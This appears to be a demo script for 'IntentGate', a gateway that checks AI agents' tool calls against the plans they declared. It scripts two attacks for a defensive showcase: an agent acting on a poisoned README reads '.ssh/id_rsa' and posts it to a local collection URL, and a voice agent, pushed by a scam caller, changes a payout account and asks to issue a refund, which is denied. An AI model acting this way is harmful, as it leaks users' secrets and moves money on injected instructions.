/**
 * Drives IntentGate through both demo scenarios with a scripted "agent", so you can
 * watch the Flight Recorder (and hear voice alerts) without a real LLM.
 *
 *   npx tsx scripts/simulate.ts [--offline] [--hold]
 *
 * --hold leaves the refund amendment waiting so you can click Approve/Deny yourself.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { loadConfig } from '../src/config.js';
import { scaffoldDemo } from '../src/demo.js';
import { startHttpGateway } from '../src/http-server.js';
import { createRuntime, log } from '../src/runtime.js';

const offline = process.argv.includes('--offline');
const keepHeld = process.argv.includes('--hold');
const tsx = path.resolve('node_modules/tsx/dist/cli.mjs');
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'intentgate-sim-'));
const { configFile } = scaffoldDemo(dir);
const raw = JSON.parse(fs.readFileSync(configFile, 'utf8'));
for (const s of Object.values(raw.servers) as Array<{ args: string[] }>) s.args = [tsx, ...s.args];
raw.approvals = { timeoutSeconds: 600 };
fs.writeFileSync(configFile, JSON.stringify(raw));

const runtime = await createRuntime(loadConfig(configFile), { offline });
const gateway = await startHttpGateway({ port: 8787, deps: runtime.deps, log });

async function agent(name: string) {
  const client = new Client({ name, version: '1.0' });
  await client.connect(new StreamableHTTPClientTransport(new URL(gateway.url)));
  return client;
}

// Scenario 1: a coding agent summarizing a poisoned README.
const coder = await agent('Claude Desktop');
await sleep(800);
await coder.callTool({
  name: 'declare_plan',
  arguments: {
    goal: 'Summarize the README in my workspace',
    steps: [{ tool: 'workspace__read_file', params: { path: 'README.md' }, why: 'The user asked for a summary' }],
  },
});
await sleep(1200);
await coder.callTool({ name: 'workspace__read_file', arguments: { path: 'README.md' } });
await sleep(1500);
await coder.callTool({ name: 'workspace__read_file', arguments: { path: '.ssh/id_rsa' } });
await sleep(1500);
await coder.callTool({ name: 'web__http_post', arguments: { url: 'http://localhost:9999/collect', body: '<key>' } });

// Scenario 2: an ElevenLabs voice agent on a support call, with a social-engineering caller.
await sleep(2500);
const voice = await agent('ElevenLabs Agent');
await sleep(800);
await voice.callTool({
  name: 'declare_plan',
  arguments: {
    goal: 'Tell the caller the status of order 1042',
    steps: [{ tool: 'shop__lookup_order', params: { order_id: '1042' }, why: 'Caller asked where their order is' }],
  },
});
await sleep(1200);
await voice.callTool({ name: 'shop__lookup_order', arguments: { order_id: '1042' } });
await sleep(1500);
await voice.callTool({ name: 'shop__update_payout_account', arguments: { customer_id: 'C-77', upi_id: 'scammer@ybl' } });
await sleep(1500);
const amend = voice.callTool({
  name: 'amend_plan',
  arguments: {
    reason: 'Caller says they want a refund sent to a new UPI id',
    steps: [{ tool: 'shop__issue_refund', params: { order_id: '1042', amount_inr: 4999 } }],
  },
});
log(keepHeld ? 'Refund amendment is waiting for you in the Flight Recorder.' : 'Waiting 4s, then a reviewer denies it…');
if (!keepHeld) {
  await sleep(4000);
  const res = await fetch('http://localhost:4747/api/events');
  const { events } = (await res.json()) as { events: Array<{ type: string; approvalId?: string }> };
  const pending = events.reverse().find((e) => e.type === 'plan.amend_requested');
  if (pending?.approvalId) {
    await fetch(`http://localhost:4747/api/approvals/${pending.approvalId}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-intentgate': '1' },
      body: JSON.stringify({ decision: 'denied' }),
    });
  }
}
await amend;
log(`Done. Flight Recorder: ${runtime.recorderUrl}  (Ctrl+C to stop)`);
